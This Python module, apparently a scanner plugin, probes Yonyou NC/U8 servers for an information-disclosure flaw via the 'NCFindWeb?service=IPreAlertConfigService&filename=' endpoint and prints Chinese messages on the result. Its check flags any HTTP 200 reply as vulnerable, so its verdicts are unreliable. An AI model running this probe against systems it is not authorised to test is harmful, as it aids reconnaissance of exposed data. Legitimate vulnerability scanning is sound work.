import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging



def nc_U8_getSessionList(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    url = urldata + 'NCFindWeb?service=IPreAlertConfigService&filename='
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360'
    }
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(url=url, headers=headers, timeout=30)
        if response.status_code == 200 and response.text != None:
            print(Vcolors.RED + "[+] 该系统可能数据库管理信息泄漏漏洞，具体URL为:{}".format(url)+Vcolors.ENDC)
        else:
            print(Vcolors.WARNING + "[x] 该系统不存在此漏洞" + Vcolors.ENDC)
    except:
        logging.error("nc_U8_getSessionList脚本出现异常")


